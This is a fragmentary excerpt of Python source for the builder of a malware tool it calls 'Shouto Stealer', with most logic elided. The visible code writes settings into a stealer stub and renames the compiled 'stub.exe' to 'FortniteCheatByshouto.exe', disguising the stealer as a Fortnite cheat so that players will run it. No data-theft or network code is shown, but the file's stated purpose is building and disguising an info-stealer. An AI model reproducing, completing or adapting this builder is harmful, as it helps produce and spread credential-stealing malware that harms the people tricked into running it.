# https://instagram.com/shoutoreal ( offical Instagram of the Shouto )
# Coded by Shouto
# Builder of Shouto Stealer
...
try:
    ...
    ctypes.windll.kernel32.SetConsoleTitleW(f"Shouto Stealer | Builder | {os.getenv('computername')}")
except:
    pass

# Class for building the Shouto
class Build:
    ...
    def CallFuncions(self) -> None:
        try:
            ...
            if os.path.exists("stub.exe"):
                os.rename("stub.exe", "FortniteCheatByshouto.exe")
    ...
    def WriteSettings(self) -> None:
        with open("Shouto.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
...
if __name__ == "__main__":
    if os.name == "nt":
        if (sys.version_info.major == 3 and sys.version_info.minor >= 10 and sys.version_info.minor < 12):
            ...
            message = "Your Python version is unsupported by Shouto. Please use Python 3.10.0 or 3.11.0"
